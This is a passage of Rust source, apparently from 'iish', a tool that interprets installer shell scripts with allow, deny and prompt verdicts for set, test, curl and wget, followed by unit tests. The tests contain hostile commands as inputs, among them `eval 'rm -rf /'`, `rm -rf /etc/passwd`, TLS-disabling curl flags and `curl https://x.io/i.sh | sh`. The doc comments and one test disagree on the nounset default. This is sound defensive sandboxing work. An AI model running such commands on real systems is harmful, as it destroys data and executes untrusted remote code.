/// `errexit` were always on: any failure aborts the run immediately
/// (see `main.rs::run`). `nounset` is the one flag that's real: iish
/// defaults it ON (refusing to expand an unset variable), but a
/// script's own explicit `set +u` — how real installers say "unset
/// expands to empty here" — is honored, as is turning it back on.
/// `set --` (rewriting the positional parameters) is not implemented.
fn evaluate_set(args: &[String]) -> Verdict {
    const KNOWN_OPTION_NAMES: &[&str] = &[
        "errexit",
        "nounset",
        "xtrace",
        "pipefail",
        "noglob",
        "verbose",
        "noclobber",
    ];
    let mut nounset: Option<bool> = None;
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        if arg == "--" {
            return deny("`set --` (rewriting positional parameters) is not implemented yet");
        }
        let (sign, rest) = match arg.strip_prefix('-').map(|r| ('-', r)) {
            Some(pair) => pair,
            None => match arg.strip_prefix('+') {
                Some(r) => ('+', r),
                None => return deny(format!("`set {arg}` is not supported")),
            },
        };
        if rest.is_empty() {
            return deny(format!("`set {sign}` with no options is not supported"));
        }
        if rest == "o" {
            match iter.next() {
                None => {} // bare `set -o`/`set +o` only prints current options
                Some(name) if name == "nounset" => nounset = Some(sign == '-'),
                Some(name) if KNOWN_OPTION_NAMES.contains(&name.as_str()) => {}
                Some(name) => return deny(format!("`set -o {name}` is not supported")),
            }
            continue;
        }
        if !rest.chars().all(|c| "eux".contains(c)) {
            return deny(format!("set option `{sign}{rest}` is not supported"));
        }
        if rest.contains('u') {
            nounset = Some(sign == '-');
        }
    }
    match nounset {
        Some(on) => allow(
            "toggles whether an unset variable expansion is refused (iish's default) or \
             expands to empty; other recognized flags are already enforced by iish's \
             fail-fast execution model",
            Action::SetNounset { on },
        ),
        None => allow(
            "recognizes only -e/-u/-x/-o <option> style flags, which iish's execution model \
             already enforces (fail-fast, no expansion of unset variables)",
            Action::Noop,
        ),
    }
}

/// `test EXPR`: side-effect-free (beyond reading the filesystem to
/// answer `-f`/`-d`/... questions), so — like `mkdir`'s "does this exist
/// already" check — its truth value is computed right now rather than
/// deferred to execution, and always allowed: nothing here mutates
/// anything.
fn evaluate_test(args: &[String]) -> Verdict {
    match eval_test_expr(args) {
        Ok(result) => allow(
            "evaluates a `test`/`[` expression only; no side effects",
            Action::Test { result },
        ),
        Err(reason) => deny(reason),
    }
}

/// `[ EXPR ]`: identical to `test EXPR`, but the trailing `]` is part of
/// the command's own syntax (bash rejects `[` without one) rather than
/// part of the expression.
fn evaluate_bracket(args: &[String]) -> Verdict {
    match args.split_last() {
        Some((last, rest)) if last == "]" => evaluate_test(rest),
        _ => deny("`[` without a matching `]`"),
    }
}

/// The subset of POSIX `test` installers actually use: 0/1-argument
/// string-truthiness forms, one leading `!` negation, a unary operator
/// (`-z`/`-n`/a filesystem question) applied to one operand, or a binary
/// operator (string or numeric comparison) between two. No `-a`/`-o`
/// combinators or parenthesized subexpressions — bash's own `test`
/// deprecates the former and installers essentially never need either.
fn eval_test_expr(args: &[String]) -> Result<bool, String> {
    if let Some((first, rest)) = args.split_first() {
        if first == "!" {
            return eval_test_expr(rest).map(|result| !result);
        }
    }
    match args {
        [] => Ok(false),
        [s] => Ok(!s.is_empty()),
        [op, arg] => eval_test_unary(op, arg),
        [lhs, op, rhs] => eval_test_binary(lhs, op, rhs),
        _ => Err(format!(
            "test expression `{}` is not supported (too many arguments)",
            args.join(" ")
        )),
    }
}

/// `-r`/`-w`/`-x` approximate real access-checking (which needs the
/// process's effective uid/gid against the path's owner/group, not
/// exposed by `std::fs` without an extra dependency) by checking whether
/// *any* of the owner/group/other permission bits is set — exact for the
/// common installer case of checking a path this run just created (so
/// it's always owned by the current user), looser than real `test` for
/// a path owned by someone else.
fn eval_test_unary(op: &str, arg: &str) -> Result<bool, String> {
    use std::os::unix::fs::PermissionsExt;
    let path = Path::new(arg);
    match op {
        "-z" => Ok(arg.is_empty()),
        "-n" => Ok(!arg.is_empty()),
        "-e" => Ok(path.exists()),
        "-f" => Ok(path.is_file()),
        "-d" => Ok(path.is_dir()),
        "-L" | "-h" => Ok(fs::symlink_metadata(path)
            .map(|m| m.file_type().is_symlink())
            .unwrap_or(false)),
        "-s" => Ok(fs::metadata(path).map(|m| m.len() > 0).unwrap_or(false)),
        "-x" => Ok(fs::metadata(path)
            .map(|m| m.permissions().mode() & 0o111 != 0)
            .unwrap_or(false)),
        "-r" => Ok(fs::metadata(path)
            .map(|m| m.permissions().mode() & 0o444 != 0)
            .unwrap_or(false)),
        "-w" => Ok(fs::metadata(path)
            .map(|m| m.permissions().mode() & 0o222 != 0)
            .unwrap_or(false)),
        "-t" => eval_test_isatty(arg),
        _ => Err(format!("test operator `{op}` is not supported")),
    }
}

/// `-t FD`: is file descriptor `FD` a terminal? Installers use this
/// (almost always `-t 1`) to decide whether to print color/progress
/// output. Only the three standard descriptors are meaningful here —
/// iish has no others open on the script's behalf.
fn eval_test_isatty(fd: &str) -> Result<bool, String> {
    use std::io::IsTerminal;
    match fd {
        "0" => Ok(std::io::stdin().is_terminal()),
        "1" => Ok(std::io::stdout().is_terminal()),
        "2" => Ok(std::io::stderr().is_terminal()),
        _ => Err(format!(
            "test -t {fd}: only file descriptors 0/1/2 are supported"
        )),
    }
}

fn eval_test_binary(lhs: &str, op: &str, rhs: &str) -> Result<bool, String> {
    match op {
        "=" | "==" => Ok(lhs == rhs),
        "!=" => Ok(lhs != rhs),
        "-eq" | "-ne" | "-lt" | "-le" | "-gt" | "-ge" => {
            let l: i64 = lhs
                .parse()
                .map_err(|_| format!("test: `{lhs}` is not an integer"))?;
            let r: i64 = rhs
                .parse()
                .map_err(|_| format!("test: `{rhs}` is not an integer"))?;
            Ok(match op {
                "-eq" => l == r,
                "-ne" => l != r,
                "-lt" => l < r,
                "-le" => l <= r,
                "-gt" => l > r,
                "-ge" => l >= r,
                _ => unreachable!(),
            })
        }
        _ => Err(format!("test operator `{op}` is not supported")),
    }
}

/// What `curl --help` prints under iish: the flags iish's own GET-only
/// client accepts, in the layout scripts grep (rustup runs `curl
/// --help` and greps for `--proto` and `--tlsv1.2` before daring to
/// pass them).
const CURL_HELP: &str = "Usage: curl [options...] <url>
iish's built-in GET-only fetch; the flags it accepts:
     --compressed         Request compressed response
     --connect-timeout <seconds> Maximum time for connection
 -f, --fail               Fail fast with no output on HTTP errors
 -L, --location           Follow redirects
     --max-time <seconds> Maximum time for transfer
     --no-progress-meter  Do not show progress meter
 -o, --output <file>      Write to file instead of stdout
 -#, --progress-bar       Display progress as a bar
     --proto <protocols>  Enable/disable PROTOCOLS
 -O, --remote-name        Write output to file named as remote file
     --retry <num>        Retry on transient errors
     --retry-delay <seconds> Wait between retries
 -s, --silent             Silent mode
 -S, --show-error         Show errors even in silent mode
     --tlsv1.2            TLSv1.2 or greater (always enforced)
     --tlsv1.3            TLSv1.3 or greater
";

/// What `curl -V`/`--version` prints under iish: names the real TLS
/// backend (rustls) so a script probing for OpenSSL-specific behavior
/// (rustup's cipher-suite handling) correctly concludes it isn't one.
const CURL_VERSION: &str = "curl 8.0.0-iish (iish built-in fetch) rustls
Protocols: http https
Features: HTTPS-only-redirects
";

/// curl: only plain GET shapes are permitted, and iish performs the
/// fetch itself with its own HTTP client rather than invoking the real
/// binary. Every flag must be on the allowlist below; anything else —
/// non-GET methods, data uploads, `--insecure`, config files, … — is
/// denied by not being on it.
fn evaluate_curl(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
    if config.network == NetworkPolicy::Deny {
        return deny("network access is disabled by configuration");
    }
    let mut output: Option<String> = None;
    let mut remote_name = false;
    let mut urls: Vec<&str> = Vec::new();

    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        if let Some(long) = arg.strip_prefix("--") {
            let (flag, inline_value) = match long.split_once('=') {
                Some((f, v)) => (f, Some(v.to_string())),
                None => (long, None),
            };
            let mut take_value = |what: &str| match inline_value.clone() {
                Some(v) => Ok(v),
                None => iter
                    .next()
                    .cloned()
                    .ok_or_else(|| format!("curl --{flag} is missing its {what}")),
            };
            match flag {
                // Benign behavior flags. The TLS-minimum flags are
                // accepted because iish's own client (rustls) already
                // refuses anything below TLS 1.2 — the flag asks for
                // what is always true.
                "fail" | "silent" | "show-error" | "location" | "progress-bar"
                | "no-progress-meter" | "compressed" | "tlsv1.2" | "tlsv1.3" => {}
                // `curl --help`: rustup greps the help text to decide
                // whether it may pass `--proto`/`--tlsv1.2`. Answer for
                // iish's own client, which accepts exactly these.
                "help" => {
                    return allow(
                        "prints iish's own curl-compatibility help text; fetches nothing",
                        Action::Print {
                            text: CURL_HELP.to_string(),
                            dest: StdoutDest::Inherit,
                        },
                    )
                }
                "version" => {
                    return allow(
                        "prints iish's own curl-compatibility version line; fetches nothing",
                        Action::Print {
                            text: CURL_VERSION.to_string(),
                            dest: StdoutDest::Inherit,
                        },
                    )
                }
                "remote-name" => remote_name = true,
                "output" => match take_value("filename") {
                    Ok(v) => output = Some(v),
                    Err(reason) => return deny(reason),
                },
                // Take a value we don't need: iish's own client decides
                // protocols, retries, and timeouts.
                "proto" | "retry" | "retry-delay" | "connect-timeout" | "max-time" => {
                    if let Err(reason) = take_value("value") {
                        return deny(reason);
                    }
                }
                "insecure" => return deny("curl --insecure disables TLS verification; refusing"),
                _ => return deny(format!("curl option `--{flag}` is not supported by iish")),
            }
        } else if let Some(cluster) = arg.strip_prefix('-') {
            if cluster.is_empty() {
                return deny("curl `-` (stdin) is not supported");
            }
            let mut chars = cluster.chars();
            while let Some(c) = chars.next() {
                match c {
                    'f' | 's' | 'S' | 'L' | '#' => {}
                    'V' => {
                        return allow(
                            "prints iish's own curl-compatibility version line; fetches nothing",
                            Action::Print {
                                text: CURL_VERSION.to_string(),
                                dest: StdoutDest::Inherit,
                            },
                        )
                    }
                    'O' => remote_name = true,
                    'o' => {
                        // `-ofile` or `-o file`.
                        let rest: String = chars.collect();
                        let value = if rest.is_empty() {
                            match iter.next() {
                                Some(v) => v.clone(),
                                None => return deny("curl -o is missing its filename"),
                            }
                        } else {
                            rest
                        };
                        output = Some(value);
                        break;
                    }
                    'k' => return deny("curl -k disables TLS verification; refusing"),
                    other => {
                        return deny(format!("curl option `-{other}` is not supported by iish"))
                    }
                }
            }
        } else {
            urls.push(arg);
        }
    }

    finish_fetch("curl", &urls, output, remote_name, ctx, config)
}

/// wget, same posture as curl: a small allowlist of flags, GET only,
/// fetched in-process.
fn evaluate_wget(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
    if config.network == NetworkPolicy::Deny {
        return deny("network access is disabled by configuration");
    }
    let mut output: Option<String> = None;
    let mut urls: Vec<&str> = Vec::new();

    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-q" | "--quiet" | "-nv" | "--no-verbose" | "--https-only" => {}
            "-O" | "--output-document" => match iter.next() {
                Some(v) => output = Some(v.clone()),
                None => return deny(format!("wget {arg} is missing its filename")),
            },
            a if a.starts_with("--output-document=") => {
                output = Some(a["--output-document=".len()..].to_string());
            }
            "--no-check-certificate" => {
                return deny("wget --no-check-certificate disables TLS verification; refusing")
            }
            a if a.starts_with('-') && a.len() > 1 => {
                return deny(format!("wget option `{a}` is not supported by iish"))
            }
            a => urls.push(a),
        }
    }

    // wget writes to the URL's basename when no -O is given.
    finish_fetch("wget", &urls, output, true, ctx, config)
}

/// Shared tail of curl/wget evaluation: validate the URL, resolve where
/// the body goes, and apply the overwrite policy.
fn finish_fetch(
    name: &str,
    urls: &[&str],
    output: Option<String>,
    remote_name: bool,
    ctx: &ExpandCtx,
    config: &Config,
) -> Verdict {
    let url = match urls {
        [] => return deny(format!("{name} without a URL")),
        [url] => (*url).to_string(),
        _ => return deny(format!("{name} with multiple URLs is not supported")),
    };
    if !url.starts_with("https://") && !url.starts_with("http://") {
        return deny(format!(
            "{name}: only http(s) URLs are allowed, got `{url}`"
        ));
    }

    let destination = match output {
        Some(path) if path == "-" => FetchOutput::Stdout,
        Some(path) => FetchOutput::File(state::normalize(Path::new(&path))),
        None if remote_name => {
            // Basename of the URL path, query and fragment stripped.
            let trimmed = url.split(['?', '#']).next().unwrap_or("");
            let after_scheme = trimmed.split_once("://").map(|(_, r)| r).unwrap_or(trimmed);
            let base = match after_scheme.split_once('/') {
                Some((_, path)) => path.rsplit('/').next().unwrap_or(""),
                None => "",
            };
            if base.is_empty() {
                return deny(format!(
                    "{name}: cannot infer an output filename from `{url}`; use -O/-o with a name"
                ));
            }
            FetchOutput::File(state::normalize(Path::new(base)))
        }
        None => FetchOutput::Stdout,
    };

    let action = Action::Fetch {
        url: url.clone(),
        output: destination.clone(),
    };
    match &destination {
        FetchOutput::Stdout => allow(
            format!("GET `{url}` to stdout, fetched by iish's own HTTP client"),
            action,
        ),
        FetchOutput::File(path) if !path.exists() => allow(
            format!(
                "GET `{url}` to new file `{}`, fetched by iish's own HTTP client",
                path.display()
            ),
            action,
        ),
        FetchOutput::File(path) if ctx.session.owns(path) => allow(
            format!(
                "GET `{url}` overwrites `{}`, a file this run created",
                path.display()
            ),
            action,
        ),
        FetchOutput::File(path) => match config.overwrite {
            Verb::Ask => prompt(
                format!(
                    "GET `{url}` would overwrite pre-existing `{}`",
                    path.display()
                ),
                action,
            ),
            Verb::Allow => allow(
                format!(
                    "GET `{url}` overwrites pre-existing `{}` (allowed by configuration)",
                    path.display()
                ),
                action,
            ),
            Verb::Deny => deny(format!(
                "GET `{url}` would overwrite pre-existing `{}`; overwriting is disabled by configuration",
                path.display()
            )),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::{parse, RefuseSubstituter};
    use crate::state::Session;

    fn verdict(line: &str) -> Verdict {
        verdict_with(line, &mut Session::new())
    }

    fn verdict_with(line: &str, session: &mut Session) -> Verdict {
        verdict_with_config(line, session, &Config::default())
    }

    fn verdict_with_config(line: &str, session: &mut Session, config: &Config) -> Verdict {
        let program = parse(line).expect("should parse");
        let program_items = items(&program);
        let item = program_items.first().expect("should have one statement");
        let mut subst = RefuseSubstituter("command substitution refused in this test");
        let mut ctx = ExpandCtx {
            session,
            subst: &mut subst,
        };
        evaluate_item(item, &mut ctx, config).verdict
    }

    use Verdict::{Allow, Call, Deny, Group, Prompt};

    #[test]
    fn allows_echo() {
        match verdict("echo hello world") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "hello world\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn echo_n_suppresses_newline() {
        match verdict("echo -n hi") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "hi"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn printf_renders_repeating_format() {
        match verdict(r"printf '%s\n' one two") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "one\ntwo\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn printf_denies_unknown_directives() {
        assert!(matches!(verdict(r"printf '%q\n' foo"), Deny { .. }));
    }

    #[test]
    fn unknown_binaries_ask_by_default() {
        // Milestone 5: PLAN.md's built-in default is "unlisted
        // subprocesses ⇒ ask", not a hard deny. This is also how
        // `sudo <cmd>` behaves pre-broker.
        match verdict("sudo make install") {
            Prompt {
                action:
                    Action::Subprocess {
                        name,
                        args,
                        stdout,
                        stderr,
                    },
                ..
            } => {
                assert_eq!(name, "sudo");
                assert_eq!(args, vec!["make", "install"]);
                assert_eq!(stdout, StdoutDest::Inherit);
                assert_eq!(stderr, StderrDest::Inherit);
            }
            other => panic!("expected prompt/subprocess, got {other:?}"),
        }
    }

    #[test]
    fn subprocess_deny_config_denies_unknown_binaries() {
        let config = Config {
            subprocess: Verb::Deny,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config("sudo make install", &mut Session::new(), &config),
            Deny { .. }
        ));
    }

    #[test]
    fn subprocess_allow_config_allows_unknown_binaries() {
        let config = Config {
            subprocess: Verb::Allow,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config("uname -a", &mut Session::new(), &config),
            Allow {
                action: Action::Subprocess { .. },
                ..
            }
        ));
    }

    #[test]
    fn per_command_override_wins_over_subprocess_default() {
        let mut config = Config {
            subprocess: Verb::Allow,
            ..Config::default()
        };
        config.commands.insert("systemctl".to_string(), Verb::Deny);
        assert!(matches!(
            verdict_with_config("systemctl enable foo", &mut Session::new(), &config),
            Deny { .. }
        ));
    }

    #[test]
    fn config_deny_override_beats_native_command_logic() {
        let mut config = Config::default();
        config.commands.insert("curl".to_string(), Verb::Deny);
        assert!(matches!(
            verdict_with_config("curl https://example.com", &mut Session::new(), &config),
            Deny { .. }
        ));
    }

    #[test]
    fn shells_are_denied_even_if_configured_allow() {
        let mut config = Config {
            subprocess: Verb::Allow,
            ..Config::default()
        };
        config.commands.insert("bash".to_string(), Verb::Allow);
        assert!(matches!(
            verdict_with_config("bash script.sh", &mut Session::new(), &config),
            Deny { .. }
        ));
    }

    #[test]
    fn shell_builtins_are_denied_even_if_configured_allow() {
        let config = Config {
            subprocess: Verb::Allow,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config("export FOO=bar", &mut Session::new(), &config),
            Deny { .. }
        ));
        assert!(matches!(
            verdict_with_config("eval 'rm -rf /'", &mut Session::new(), &config),
            Deny { .. }
        ));
        assert!(matches!(
            verdict_with_config("alias local=typeset", &mut Session::new(), &config),
            Deny { .. }
        ));
    }

    #[test]
    fn recognized_but_unimplemented_binaries_use_subprocess_tier() {
        let config = Config {
            subprocess: Verb::Allow,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config("mv a b", &mut Session::new(), &config),
            Allow {
                action: Action::Subprocess { .. },
                ..
            }
        ));
    }

    #[test]
    fn network_deny_config_denies_curl_and_wget() {
        let config = Config {
            network: NetworkPolicy::Deny,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config("curl https://example.com", &mut Session::new(), &config),
            Deny { .. }
        ));
        assert!(matches!(
            verdict_with_config("wget https://example.com", &mut Session::new(), &config),
            Deny { .. }
        ));
    }

    #[test]
    fn overwrite_allow_config_skips_the_prompt() {
        let config = Config {
            overwrite: Verb::Allow,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config(
                "curl -o /etc/hostname https://example.com/x",
                &mut Session::new(),
                &config
            ),
            Allow {
                action: Action::Fetch { .. },
                ..
            }
        ));
    }

    #[test]
    fn overwrite_deny_config_refuses_outright() {
        let config = Config {
            overwrite: Verb::Deny,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config(
                "curl -o /etc/hostname https://example.com/x",
                &mut Session::new(),
                &config
            ),
            Deny { .. }
        ));
    }

    #[test]
    fn self_call_policy_governs_executing_an_installed_path() {
        let mut session = Session::new();
        session.record_created("/tmp/iish-nonexistent-stage2");
        session.record_executable("/tmp/iish-nonexistent-stage2/install.sh");
        let config = Config {
            self_call: Verb::Deny,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config(
                "/tmp/iish-nonexistent-stage2/install.sh --now",
                &mut session,
                &config
            ),
            Deny { .. }
        ));

        let config = Config {
            self_call: Verb::Allow,
            subprocess: Verb::Deny,
            run_created: Verb::Deny,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config(
                "/tmp/iish-nonexistent-stage2/install.sh --now",
                &mut session,
                &config
            ),
            Allow {
                action: Action::Subprocess { .. },
                ..
            }
        ));
    }

    #[test]
    fn denies_rm_of_foreign_paths() {
        assert!(matches!(verdict("rm -rf /etc/passwd"), Deny { .. }));
    }

    #[test]
    fn allows_rm_of_owned_paths() {
        let mut session = Session::new();
        session.record_created("/tmp/iish-nonexistent/tool-staging");
        match verdict_with("rm -rf /tmp/iish-nonexistent/tool-staging", &mut session) {
            Allow {
                action:
                    Action::Remove {
                        recursive: true,
                        force: true,
                        ..
                    },
                ..
            } => {}
            other => panic!("expected allow/remove -rf, got {other:?}"),
        }
    }

    #[test]
    fn denies_chmod_of_foreign_paths() {
        assert!(matches!(verdict("chmod 755 /etc/passwd"), Deny { .. }));
    }

    #[test]
    fn allows_chmod_of_owned_paths() {
        let mut session = Session::new();
        session.record_created("/tmp/iish-nonexistent");
        match verdict_with("chmod +x /tmp/iish-nonexistent/tool", &mut session) {
            Allow {
                action:
                    Action::Chmod {
                        mode: Mode::AddBits(0o111),
                        ..
                    },
                ..
            } => {}
            other => panic!("expected allow/chmod +x, got {other:?}"),
        }
    }

    #[test]
    fn denies_curl_post() {
        assert!(matches!(
            verdict("curl -X POST https://example.com"),
            Deny { .. }
        ));
    }

    #[test]
    fn denies_curl_insecure() {
        assert!(matches!(
            verdict("curl -fsSLk https://example.com"),
            Deny { .. }
        ));
        assert!(matches!(
            verdict("curl --insecure https://example.com"),
            Deny { .. }
        ));
    }

    #[test]
    fn allows_curl_get_to_new_file() {
        match verdict("curl -fsSLo /tmp/iish-nonexistent-dl.tar.gz https://example.com/t.tar.gz") {
            Allow {
                action: Action::Fetch { url, output },
                ..
            } => {
                assert_eq!(url, "https://example.com/t.tar.gz");
                assert_eq!(
                    output,
                    FetchOutput::File(PathBuf::from("/tmp/iish-nonexistent-dl.tar.gz"))
                );
            }
            other => panic!("expected allow/fetch, got {other:?}"),
        }
    }

    #[test]
    fn curl_remote_name_uses_url_basename() {
        match verdict("curl -sSfLO https://example.com/pkg/tool-v1.tar.gz") {
            Allow {
                action:
                    Action::Fetch {
                        output: FetchOutput::File(path),
                        ..
                    },
                ..
            } => assert_eq!(path, state::normalize(Path::new("tool-v1.tar.gz"))),
            other => panic!("expected allow/fetch to file, got {other:?}"),
        }
    }

    #[test]
    fn curl_overwrite_of_existing_file_prompts() {
        assert!(matches!(
            verdict("curl -o /etc/hostname https://example.com/x"),
            Prompt { .. }
        ));
    }

    #[test]
    fn curl_to_stdout_is_allowed() {
        assert!(matches!(
            verdict("curl -fsSL https://example.com/install.sh"),
            Allow {
                action: Action::Fetch {
                    output: FetchOutput::Stdout,
                    ..
                },
                ..
            }
        ));
    }

    #[test]
    fn denies_curl_without_url() {
        assert!(matches!(verdict("curl -fsSL"), Deny { .. }));
        assert!(matches!(verdict("curl ftp://example.com/f"), Deny { .. }));
    }

    #[test]
    fn wget_defaults_to_url_basename() {
        match verdict("wget -q https://example.com/tool.tar.gz") {
            Allow {
                action:
                    Action::Fetch {
                        output: FetchOutput::File(path),
                        ..
                    },
                ..
            } => assert_eq!(path, state::normalize(Path::new("tool.tar.gz"))),
            other => panic!("expected allow/fetch to file, got {other:?}"),
        }
    }

    #[test]
    fn wget_denies_disabling_tls_checks() {
        assert!(matches!(
            verdict("wget --no-check-certificate https://example.com/t"),
            Deny { .. }
        ));
    }

    #[test]
    fn mkdir_of_new_dirs_is_allowed() {
        match verdict("mkdir -p /tmp/iish-nonexistent/a") {
            Allow {
                action: Action::MkDir { paths, parents },
                ..
            } => {
                assert!(parents);
                assert_eq!(paths, vec![PathBuf::from("/tmp/iish-nonexistent/a")]);
            }
            other => panic!("expected allow/mkdir, got {other:?}"),
        }
    }

    #[test]
    fn mkdir_p_on_existing_dir_is_a_noop() {
        assert!(matches!(
            verdict("mkdir -p /tmp"),
            Allow {
                action: Action::Noop,
                ..
            }
        ));
    }

    #[test]
    fn mkdir_without_p_on_existing_dir_is_denied() {
        assert!(matches!(verdict("mkdir /tmp"), Deny { .. }));
    }

    #[test]
    fn piping_into_a_shell_becomes_a_sub_iish_verdict() {
        // `curl … | sh` is handled, not refused: the producer (`curl`)
        // is captured and the downloaded script interpreted by iish.
        match verdict("curl https://x.io/i.sh | sh") {
            Verdict::PipeToShell { producer, shell } => {
                assert_eq!(producer.len(), 1);
                assert_eq!(shell, "sh");
            }
            other => panic!("expected a PipeToShell verdict, got {other:?}"),
        }
        // `sh -s` (read the script from stdin) is the same shape.
        assert!(matches!(
            verdict("curl https://x.io/i.sh | bash -s"),
            Verdict::PipeToShell { .. }
        ));
    }

    #[test]
    fn a_shell_with_args_or_mid_pipeline_is_still_refused() {
        // `sh -c '…'` after a pipe is a different shape (an inline
        // command, not "run the piped script"): refused.
        assert!(matches!(
            verdict("curl https://x.io/i.sh | sh -c 'echo hi'"),
            Deny { .. }
        ));
        // A shell that is not the last stage has no coherent handling.
        assert!(matches!(verdict("echo hi | sh | grep x"), Deny { .. }));
    }

    #[test]
    fn multi_stage_pipelines_produce_a_pipe_verdict() {
        match verdict("cat foo | grep bar") {
            Verdict::Pipe { stages } => assert_eq!(stages.len(), 2),
            other => panic!("expected a pipe verdict, got {other:?}"),
        }
    }

    #[test]
    fn cd_compiles_to_a_native_directory_change() {
        assert!(matches!(
            verdict("cd /tmp"),
            Allow {
                action: Action::ChangeDir { .. },
                ..
            }
        ));
    }

    #[test]
    fn unset_variable_expansion_follows_the_nounset_option() {
        // bash's default: unset expands to empty.
        match verdict("echo $NOT_A_REAL_VARIABLE_IISH_TEST") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
        // After the script's own `set -u`, refused instead.
        let mut session = Session::new();
        session.set_nounset(true);
        assert!(matches!(
            verdict_with("echo $NOT_A_REAL_VARIABLE_IISH_TEST", &mut session),
            Deny { .. }
        ));
    }

    #[test]
    fn set_u_compiles_to_a_nounset_toggle() {
        assert!(matches!(
            verdict("set -u"),
            Allow {
                action: Action::SetNounset { on: true },
                ..
            }
        ));
        assert!(matches!(
            verdict("set +u"),
            Allow {
                action: Action::SetNounset { on: false },
                ..
            }
        ));
        assert!(matches!(
            verdict("set -o nounset"),
            Allow {
                action: Action::SetNounset { on: true },
                ..
            }
        ));
    }

    #[test]
    fn expands_a_real_environment_variable() {
        let home = std::env::var("HOME").expect("test environment should have $HOME set");
        match verdict("echo $HOME") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, format!("{home}\n")),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn default_value_expansion_is_supported_now() {
        match verdict(r#"echo "${IISH_UNSET_FOR_SURE:-default}""#) {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "default\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn special_parameters_resolve_in_statements() {
        // `$?` starts at 0.
        match verdict("echo $?") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "0\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
        // `$1` with no positional parameters is unset → denied once the
        // script opts into `set -u`.
        let mut session = Session::new();
        session.set_nounset(true);
        assert!(matches!(verdict_with("echo $1", &mut session), Deny { .. }));
    }

    #[test]
    fn pattern_removal_expansion_works() {
        let mut session = Session::new();
        session.set_variable("SHELL", "/bin/bash");
        match verdict_with(
            r#"echo "${SHELL#*bin}" "${SHELL##*/}" "${SHELL%/*}""#,
            &mut session,
        ) {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "/bash bash /bin\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn if_clause_produces_an_if_verdict() {
        match verdict("if true; then echo hi; fi") {
            Verdict::If {
                condition,
                then_branch,
                elses,
            } => {
                assert_eq!(condition.len(), 1);
                assert_eq!(then_branch.len(), 1);
                assert!(elses.is_none());
            }
            other => panic!("expected an if verdict, got {other:?}"),
        }
    }

    #[test]
    fn if_elif_else_produces_an_if_verdict_with_elses() {
        match verdict("if true; then echo a; elif false; then echo b; else echo c; fi") {
            Verdict::If { elses, .. } => {
                let elses = elses.expect("expected elif/else clauses");
                assert_eq!(elses.len(), 2);
                assert!(
                    elses[0].condition.is_some(),
                    "elif should carry a condition"
                );
                assert!(
                    elses[1].condition.is_none(),
                    "else should carry no condition"
                );
            }
            other => panic!("expected an if verdict, got {other:?}"),
        }
    }

    #[test]
    fn for_loop_produces_a_for_verdict() {
        match verdict("for f in a b; do echo x; done") {
            Verdict::For {
                variable,
                values,
                body,
            } => {
                assert_eq!(variable, "f");
                assert_eq!(values.expect("value words").len(), 2);
                assert_eq!(body.len(), 1);
            }
            other => panic!("expected a for verdict, got {other:?}"),
        }
    }

    #[test]
    fn while_and_until_produce_while_verdicts() {
        match verdict("while true; do echo hi; done") {
            Verdict::While { until: false, .. } => {}
            other => panic!("expected a while verdict, got {other:?}"),
        }
        match verdict("until true; do echo hi; done") {
            Verdict::While { until: true, .. } => {}
            other => panic!("expected an until verdict, got {other:?}"),
        }
    }

    #[test]
    fn bang_produces_a_not_verdict_with_the_bang_stripped() {
        match verdict("! test -d /definitely-not-real") {
            Verdict::Not { pipeline } => assert!(!pipeline.bang),
            other => panic!("expected a not verdict, got {other:?}"),
        }
    }

    #[test]
    fn subshell_produces_a_subshell_verdict() {
        match verdict("( echo hi; echo bye )") {
            Verdict::Subshell { statements } => assert_eq!(statements.len(), 2),
            other => panic!("expected a subshell verdict, got {other:?}"),
        }
    }

    #[test]
    fn empty_command_word_takes_the_command_from_the_next_field() {
        // `${sudo} tar …` with an empty `$sudo`: bash skips the empty
        // leading word and `tar` becomes the command (here the
        // subprocess tier, since tar has no native impl).
        match verdict("$EMPTY_IISH_VAR uname -a") {
            Prompt {
                action: Action::Subprocess { name, args, .. },
                ..
            } => {
                assert_eq!(name, "uname");
                assert_eq!(args, vec!["-a"]);
            }
            other => panic!("expected prompt/subprocess for uname, got {other:?}"),
        }
    }

    #[test]
    fn a_line_expanding_to_nothing_is_a_noop() {
        assert!(matches!(
            verdict("$EMPTY_IISH_VAR"),
            Allow {
                action: Action::Noop,
                ..
            }
        ));
    }

    #[test]
    fn touch_of_a_new_file_is_allowed_and_recorded() {
        let dir = scratch_dir("touch-new");
        match verdict(&format!("touch {}", dir.join("marker").display())) {
            Allow {
                action: Action::Touch { paths },
                ..
            } => assert_eq!(paths, vec![dir.join("marker")]),
